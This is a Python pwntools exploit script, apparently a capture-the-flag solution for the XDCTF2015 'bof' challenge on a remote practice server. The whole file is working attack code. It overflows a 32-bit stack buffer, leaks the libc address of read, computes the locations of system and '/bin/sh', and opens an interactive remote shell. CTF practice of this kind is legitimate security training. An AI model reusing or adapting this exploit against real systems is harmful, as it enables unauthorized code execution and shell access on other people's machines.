#! /usr/bin/python

from pwn import *
from LibcSearcher import *

#p = process('./bof')
p = remote('node3.buuoj.cn',27891)
elf = ELF('./bof')



offset = 112
main = 0x804851C
write_plt = elf.symbols['write']
read_got = elf.got['read']
read_plt = elf.symbols['read']
bss = elf.bss()+0x100


p.recvline()
payload='a'*0x6c+'b'*0x4+p32(write_plt)+p32(main)+p32(1)+p32(read_got)+p32(0x4)
p.sendline(payload)
read = u32(p.recv(4))
libc = LibcSearcher('read',read)
libc_base = read - libc.dump('read')

system = libc_base + libc.dump('system')
sh = libc_base + libc.dump('str_bin_sh')

'''
payload = 'A' * 112 + p32(read) + p32(main) + p32(0) + p32(bss) + p32(8)
p.recvuntil('Welcome to XDCTF2015~!\n')
p.sendline(payload)
p.sendline('/bin/sh\x00')
'''

payload = 'A' * 112 + p32(system) + p32(main) + p32(sh)
p.recvuntil('Welcome to XDCTF2015~!\n')
p.sendline(payload)
p.interactive()
